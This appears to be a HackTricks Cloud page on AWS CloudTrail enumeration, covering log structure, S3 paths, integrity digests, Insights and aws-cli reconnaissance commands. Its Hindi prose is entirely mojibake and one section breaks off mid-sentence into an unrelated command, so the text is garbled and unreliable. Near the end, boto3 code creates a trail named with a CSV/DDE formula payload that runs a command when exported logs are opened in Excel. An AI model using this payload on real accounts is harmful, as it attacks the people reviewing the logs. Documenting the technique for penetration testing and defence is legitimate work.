# AWS - CloudTrail Enum

<details>

<summary><strong>рдмрдврд╝рд┐рдпрд╛ рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдХреЛ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ,** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>

## **CloudTrail**

AWS CloudTrail **рдЖрдкрдХреЗ AWS environment рдореЗрдВ рд╣реЛрдиреЗ рд╡рд╛рд▓реА рдЧрддрд┐рд╡рд┐рдзрд┐ рдХреЛ рд░рд┐рдХреЙрд░реНрдб рдФрд░ рдореЙрдирд┐рдЯрд░ рдХрд░рддрд╛ рд╣реИ**ред рдпрд╣ AWS рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рд╕рд╛рде рд╣реБрдП рд╕рднреА рдЗрдВрдЯрд░реИрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рд╡рд┐рд╕реНрддреГрдд **рдЗрд╡реЗрдВрдЯ рд▓реЙрдЧ** рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдХреМрди рдХреНрдпрд╛ рдХрд░рддрд╛ рд╣реИ, рдХрдм рдФрд░ рдХрд╣рд╛рдБ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг, рдЕрдиреБрдкрд╛рд▓рди рдореЗрдВ рдорджрдж рдХрд░рдиреЗ рдФрд░ рд╕рдВрд╕рд╛рдзрди рдкрд░рд┐рд╡рд░реНрддрди рдХреЗ рдЯреНрд░реИрдХрд┐рдВрдЧ рдореЗрдВ рдПрдХ рдСрдбрд┐рдЯ рдЯреНрд░реЗрд▓ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред CloudTrail, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ рд╕рдВрд╕рд╛рдзрди рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ рд╕рдордЭрдиреЗ, рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрдерд┐рддрд┐ рдХреЛ рдмреЗрд╣рддрд░ рдмрдирд╛рдиреЗ рдФрд░ рдирд┐рдпрд╛рдордХ рд╕рдВрдЧрдарди рдХрд╛ рдкрд╛рд▓рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИред

рдкреНрд░рддреНрдпреЗрдХ рд▓реЙрдЧ рдЗрд╡реЗрдВрдЯ рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИ:

* рдХреЙрд▓ рдХреА рдЧрдИ API рдХрд╛ рдирд╛рдо: `eventName`
* рдХреЙрд▓ рдХреА рдЧрдИ рд╕реЗрд╡рд╛: `eventSource`
* рд╕рдордп: `eventTime`
* IP рдкрддрд╛: `SourceIPAddress`
* рдПрдЬреЗрдВрдЯ рдореЗрдердб: `userAgent`ред рдЙрджрд╛рд╣рд░рдг:
* Signing.amazonaws.com - AWS Management Console рд╕реЗ
* console.amazonaws.com - рдЦрд╛рддреЗ рдХрд╛ рд░реВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛
* lambda.amazonaws.com - AWS Lambda
* рдЕрдиреБрд░реЛрдз рдкреИрд░рд╛рдореАрдЯрд░: `requestParameters`
* рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рддрддреНрд╡: `responseElements`

рдЗрд╡реЗрдВрдЯреНрд╕ рдХреЛ рдПрдХ рдирдП рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ **рд▓рдЧрднрдЧ рд╣рд░ 5 рдорд┐рдирдЯ рдореЗрдВ JSON рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ**, рдпрд╣ CloudTrail рджреНрд╡рд╛рд░рд╛ рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЕрдВрдд рдореЗрдВ, рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓реЗрдВ **рд▓рдЧрднрдЧ 15 рдорд┐рдирдЯ рдХреЗ рдмрд╛рдж S3 рдореЗрдВ рдбрд┐рд▓реАрд╡рд░ рд╣реЛрддреА рд╣реИрдВ**ред\
CloudTrail рд▓реЙрдЧреНрд╕ рдХреЛ **рдПрдХрд╛рдзрд┐рдХ рдЦрд╛рддреЛрдВ рдФрд░ рдХреНрд╖реЗрддреНрд░реЛрдВ рдореЗрдВ рдПрдХрддреНрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред\
CloudTrail рдЖрдкрдХреЛ рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рдЕрдЦрдВрдбрддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЖрдк рдпрд╣ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░ рд╕рдХреЗрдВ рдХрд┐ рдЖрдкрдХреА рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓реЗрдВ CloudTrail рджреНрд╡рд╛рд░рд╛ рдЖрдкрдХреЛ рдбрд┐рд▓реАрд╡рд░ рдХреА рдЧрдИ рд╣реИрдВ рдФрд░ рдЙрдирдореЗрдВ рдХреЛрдИ рдмрджрд▓рд╛рд╡ рдирд╣реАрдВ рд╣реБрдП рд╣реИрдВред рдпрд╣ рдПрдХ рдбрд╛рдЗрдЬреЗрд╕реНрдЯ рдлрд╝рд╛рдЗрд▓ рдХреЗ рднреАрддрд░ рд▓реЙрдЧ рдХреА SHA-256 рд╣реИрд╢ рдмрдирд╛рддрд╛ рд╣реИред рдирдИ рд▓реЙрдЧ рдХреА SHA-256 рд╣реИрд╢ рдкреНрд░рддрд┐ рдШрдВрдЯреЗ рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИред\
рдЯреНрд░реЗрд▓ рдмрдирд╛рддреЗ рд╕рдордп рдЗрд╡реЗрдВрдЯ рд╕реЗрд▓реЗрдХреНрдЯрд░реНрд╕ рдЖрдкрдХреЛ рд▓реЙрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреНрд░реЗрд▓ рдХреЛ рдЗрдВрдЧрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВрдЧреЗ: рдкреНрд░рдмрдВрдзрди, рдбреЗрдЯрд╛ рдпрд╛ рдЗрдВрд╕рд╛рдЗрдЯреНрд╕ рдЗрд╡реЗрдВрдЯреНрд╕ред

рд▓реЙрдЧреНрд╕ рдПрдХ S3 рдмрдХреЗрдЯ рдореЗрдВ рд╕рд╣реЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди (SSE-S3) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП AWS рдЙрди рд▓реЛрдЧреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рд╛рдордЧреНрд░реА рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░реЗрдЧрд╛ рдЬрд┐рдирдХрд╛ рдЙрдирдХреЗ рдкрд╛рд╕ рдкрд╣реБрдВрдЪ рд╣реИ, рд▓реЗрдХрд┐рди рдЕрддрд┐рд░рд┐рдХреНрдд рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рд▓рд┐рдП рдЖрдк SSE рдХреЗ рд╕рд╛рде KMS рдФрд░ рдЕрдкрдиреА рдЦреБрдж рдХреА рдХреБрдВрдЬрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рд▓реЙрдЧреНрд╕ рдПрдХ **рдЗрд╕ рдирд╛рдо рдкреНрд░рд╛рд░реВрдк рд╡рд╛рд▓реЗ S3 рдмрдХреЗрдЯ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреЗ рд╣реИрдВ**:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* рдЬрд╣рд╛рдВ BucketName рд╣реИ: **`aws-cloudtrail-logs-<accountid>-<random>`**
* рдЙрджрд╛рд╣рд░рдг: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

рдкреНрд░рддреНрдпреЗрдХ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд╣рд░ рд▓реЙрдЧ рдХрд╛ рдПрдХ **рдЗрд╕ рдкреНрд░рд╛рд░реВрдк рдХрд╛ рдирд╛рдо рд╣реЛрдЧрд╛**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдиреЗрдорд┐рдВрдЧ рдирд┐рдпрдо

![](<../../../../.gitbook/assets/image (29).png>)

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, **рдбрд╛рдЗрдЬреЗрд╕реНрдЯ рдлрд╝рд╛рдЗрд▓реЗрдВ (рдлрд╝рд╛рдЗрд▓ рдЕрдЦрдВрдбрддрд╛ рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП)** рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдмрдХреЗрдЯ рдореЗрдВ рд╣реЛрдВрдЧреА:

![](<../../../../.gitbook/assets/image (22).png>)

### рдПрдХрд╛рдзрд┐рдХ рдЦрд╛рддреЛрдВ рд╕реЗ рд▓реЙрдЧреНрд╕ рдХреЛ рдПрдХрддреНрд░рд┐рдд рдХрд░реЗрдВ

* рдЙрди рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдбрд┐рд▓реАрд╡рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП AWS рдЦрд╛рддреЗ рдореЗрдВ рдПрдХ рдЯреНрд░реЗрд▓ рдмрдирд╛рдПрдВ
* CloudTrail рдХреЗ рд▓рд┐рдП рджреВрд╕рд░реЗ AWS рдЦрд╛рддреЛрдВ рдХреЛ рдпреЛрдЧреНрдпрддрд╛ рджреЗрдВ рдФрд░ рдкреНрд░рддреНрдпреЗрдХ AWS рдЦрд╛рддреЗ рдХреЛ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВ рдЬреЛ рдПрдХреНрд╕реЗрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ
* рджреВрд╕рд░реЗ AWS рдЦрд╛рддреЛрдВ рдореЗрдВ рдПрдХ
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### рд▓реЙрдЧреНрд╕ рдХреЛ CloudWatch рдореЗрдВ рднреЗрдЬреЗрдВ

**CloudTrail рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд▓реЙрдЧреНрд╕ рдХреЛ CloudWatch рдореЗрдВ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЖрдк рд╕рдВрджрд┐рдЧреНрдз рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЪреЗрддрд╛рд╡рдиреА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХреЗрдВред**\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ CloudTrail рдХреЛ рд▓реЙрдЧреНрд╕ рдХреЛ CloudWatch рдореЗрдВ рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **рд░реЛрд▓** рдмрдирд╛рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬреЛ рдЗрд╕ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдпрджрд┐ рд╕рдВрднрд╡ рд╣реЛ, рддреЛ рдЗрди рдХрд╛рд░реНрд░рд╡рд╛рдЗрдпреЛрдВ рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП AWS рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реЛрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рд░реЛрд▓ CloudTrail рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд╛рд░реНрд░рд╡рд╛рдЗрдпреЛрдВ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛:

* CreateLogStream: рдЗрд╕рд╕реЗ CloudWatch Logs рд▓реЙрдЧ рд╕реНрдЯреНрд░реАрдо рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИ
* PutLogEvents: CloudTrail рд▓реЙрдЧреНрд╕ рдХреЛ CloudWatch Logs рд▓реЙрдЧ рд╕реНрдЯреНрд░реАрдо рдореЗрдВ рдбрд┐рд▓реАрд╡рд░ рдХрд░рддрд╛ рд╣реИ

### рдЗрд╡реЗрдВрдЯ рдЗрддрд┐рд╣рд╛рд╕

CloudTrail рдЗрд╡реЗрдВрдЯ рдЗрддрд┐рд╣рд╛рд╕ рдЖрдкрдХреЛ рдПрдХ рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рдЬрд╛рдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд░рд┐рдХреЙрд░реНрдб рдХрд┐рдП рдЧрдП рд▓реЙрдЧреНрд╕ рд╣реЛрддреЗ рд╣реИрдВ:

![](<../../../../.gitbook/assets/image (24).png>)

### рдЗрдВрд╕рд╛рдЗрдЯреНрд╕

**CloudTrail рдЗрдВрд╕рд╛рдЗрдЯреНрд╕** рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ **рд╡рд┐рд╢реНрд▓реЗрд╖рдг** рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреНрд▓рд╛рдЙрдбрдЯреНрд░реЗрд▓ рдЯреНрд░реЗрд▓реНрд╕ рд╕реЗ рд▓рд┐рдЦрдиреЗ рдХреЗ рдкреНрд░рдмрдВрдзрди рдЗрд╡реЗрдВрдЯреНрд╕ рдФрд░ **рдЕрд╕рд╛рдорд╛рдиреНрдп рдЧрддрд┐рд╡рд┐рдзрд┐** рдХреА рдЪреЗрддрд╛рд╡рдиреА рджреЗрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рд╕реНрдерд╛рдкрд┐рдд рдЖрдзрд╛рд░реЛрдВ рд╕реЗ рдЕрд▓рдЧ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ `TerminateInstance` рдЗрд╡реЗрдВрдЯреНрд╕ рдореЗрдВ рд╡реГрджреНрдзрд┐ рд╣реЛрддреА рд╣реИ, рддреЛ рдЖрдк рдЗрд╕реЗ рдПрдХ рдЗрдВрд╕рд╛рдЗрдЯ рдЗрд╡реЗрдВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рджреЗрдЦреЗрдВрдЧреЗред рдпреЗ рдЗрд╡реЗрдВрдЯреНрд╕ **рдЕрд╕рд╛рдорд╛рдиреНрдп API рдЧрддрд┐рд╡рд┐рдзрд┐ рдХреЛ рдЦреЛрдЬрдиреЗ рдФрд░ рдЙрд╕ рдкрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрд░рдиреЗ рдХреЛ** рдХрднреА рдкрд╣рд▓реЗ рд╕реЗ рдЖрд╕рд╛рди рдмрдирд╛ рджреЗрддреЗ рд╣реИрдВред

рдЗрдВрд╕рд╛рдЗрдЯреНрд╕ рдХреЛ CloudTrail рд▓реЙрдЧреНрд╕ рдХреЗ рд╕рд╛рдереА рдмрдХреЗрдЯ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### рд╕реБрд░рдХреНрд╖рд╛

| CloudTrail рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдЕрдЦрдВрдбрддрд╛        | <ul><li>рд▓реЙрдЧреНрд╕ рдореЗрдВ рдЦрд┐рд▓рд╛рдлрдд рдХреА рдЧрдИ рд╣реИрдВ рдпрд╛ рдирд╣реАрдВ, рдЗрд╕реЗ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░реЗрдВ</li><li><p>рдбрд╛рдЗрдЬреЗрд╕реНрдЯ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ (рдкреНрд░рддреНрдпреЗрдХ рдлрд╝рд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП рд╣реИрд╢ рдмрдирд╛рдПрдВ)</p><ul><li>SHA-256 рд╣реИрд╢рд┐рдВрдЧ</li><li>рдбрд┐рдЬрд┐рдЯрд▓ рд╕рд╛рдЗрдирд┐рдВрдЧ рдХреЗ рд▓рд┐рдП SHA-256 рдФрд░ RSA</li><li>рдЕрдореЗрдЬрд╝реЕрди рдХреЗ рдкрд╛рд╕ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рд╡рд╛рд▓реА рдирд┐рдЬреА рдХреБрдВрдЬреА</li></ul></li><li>рдбрд╛рдЗрдЬреЗрд╕реНрдЯ рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдиреЗ рдореЗрдВ 1 рдШрдВрдЯрд╛ рд▓рдЧрддрд╛ рд╣реИ (рд╣рд░ рдШрдВрдЯреЗ рдХреЗ рдмрд╛рдж рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ)</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| рдЕрдирдзрд┐рдХреГрдд рдкрд╣реБрдБрдЪ рд░реЛрдХреЗрдВ             | <ul><li><p>IAM рдиреАрддрд┐рдпреЛрдВ рдФрд░ S3 рдмрдХреЗрдЯ рдиреАрддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ</p><ul><li>рд╕реБрд░рдХреНрд╖рд╛ рдЯреАрдо тАФ> рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдкрд╣реБрдБрдЪ</li><li>рдирд┐рд░реАрдХреНрд╖рдХ тАФ> рдХреЗрд╡рд▓ рдкрдврд╝рдиреЗ рдХреА рдкрд╣реБрдБрдЪ</li></ul></li><li>рд▓реЙрдЧреНрд╕ рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП SSE-S3/SSE-KMS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ</li></ul>                                                                                                                                        |
| рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд╣рдЯрд╛рдиреЗ рд╕реЗ рд░реЛрдХреЗрдВ | <ul><li>IAM рдФрд░ рдмрдХреЗрдЯ рдиреАрддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рд╣рдЯрд╛рдиреЗ рдХреА рдкрд╣реБрдБрдЪ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░реЗрдВ</li><li>S3 MFA рд╣рдЯрд╛рдиреЗ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ</li><li>рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рд╕рддреНрдпрд╛рдкрди рдХреЗ рд╕рд╛рде рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░реЗрдВ</li></ul>                                                                                                                                                                                            |

## рдПрдХреНрд╕реЗрд╕ рд╕рд▓рд╛рд╣рдХрд╛рд░

AWS рдПрдХреНрд╕реЗрд╕ рд╕рд▓рд╛рд╣рдХрд╛рд░ рдЕрдкрдиреЗ рдЗрдВрд╕рд╛рдЗрдЯреНрд╕ рдЬреБрдЯрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд┐рдЫрд▓реЗ 400 рджрд┐рдиреЛрдВ рдХреЗ AWS **CloudTrail рд▓реЙрдЧреНрд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ**ред CloudTrail рдПрдХ AWS рдЦрд╛рддреЗ рдореЗрдВ рдХрд┐рдП рдЧрдП AWS API рдХреЙрд▓ рдФрд░ рд╕рдВрдмрдВрдзрд┐рдд рдЗрд╡реЗрдВрдЯреНрд╕ рдХрд╛ рдЗрддрд┐рд╣рд╛рд╕ рдХреИрдкреНрдЪрд░ рдХрд░рддрд╛ рд╣реИред рдПрдХреНрд╕реЗрд╕ рд╕рд▓рд╛рд╣рдХрд╛рд░ рдЗрд╕ рдбреЗрдЯрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ IAM рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдпрд╛ рд░реЛрд▓ рдиреЗ рдХреМрди рд╕реА AWS рд╕реЗрд╡рд╛рдПрдВ рдЙрдкрдпреЛрдЧ рдХреА рд╣реИрдВ рдФрд░ рдЙрд╕ рдЙрдкрдпреЛрдЧ рдХрд╛ рд╕рдордп рдХреНрдпрд╛ рдерд╛ред рдпрд╣ AWS рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдХреЛ рд╕реВрдЪрд┐рдд рдирд┐рд░реНрдгрдп рд▓реЗрдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИ рдХрд┐ **рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ, рдХреНрдпреЛрдВрдХрд┐ рд╡реЗ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЙрдкрдпреЛрдЧ рдХреЗ рдкреИрдЯрд░реНрди рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд▓рдВрдмреЗ рд╕рдордп рддрдХ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рд╣реБрдП рд╕реЗрд╡рд╛рдУрдВ рдХреА рдкрд╣рдЪрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% hint style="success" %}
рдЗрд╕рд▓рд┐рдП, рдПрдХреНрд╕реЗрд╕ рд╕рд▓рд╛рд╣рдХрд╛рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рджрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реА **рдЕрдирд╛рд╡рд╢реНрдпрдХ рдЕрдиреБрдорддрд┐рдпреЛрдВ** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕реВрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЙрдиреНрд╣реЗрдВ рд╣рдЯрд╛ рд╕рдХреЗрдВ
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

## рдХрд╛рд░реНрд░рд╡рд╛рдЗрдпрд╛рдБ

### рдЬрд╛рдБрдЪ
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSV рдЕрдВрджрд░рдШреБрд╕рд╛рди**

CloudTrail рдХреЗ рдЕрдВрджрд░ CVS рдЕрдВрджрд░рдШреБрд╕рд╛рди рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдЬреЛ рдХрд┐ рдпрджрд┐ рд▓реЙрдЧреНрд╕ CSV рдореЗрдВ рдирд┐рд░реНрдпрд╛рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдФрд░ Excel рдХреЗ рд╕рд╛рде рдЦреЛрд▓реЗ рдЬрд╛рддреЗ рд╣реИрдВ рддреЛ рдЕрдиреБрдорд╛рдирд┐рдд рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛ред
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рдПрдХ рдмреБрд░рд╛ рдЯреНрд░реЗрд▓ рдирд╛рдо рд╡рд╛рд▓реЗ рд▓реЙрдЧ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдЙрддреНрдкрдиреНрди рдХрд░реЗрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ рдкреЗрд▓реЛрдб рд╣реЛрдЧрд╛:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП CSV Injections рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдпрд╣ рдкреЗрдЬ рджреЗрдЦреЗрдВ:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

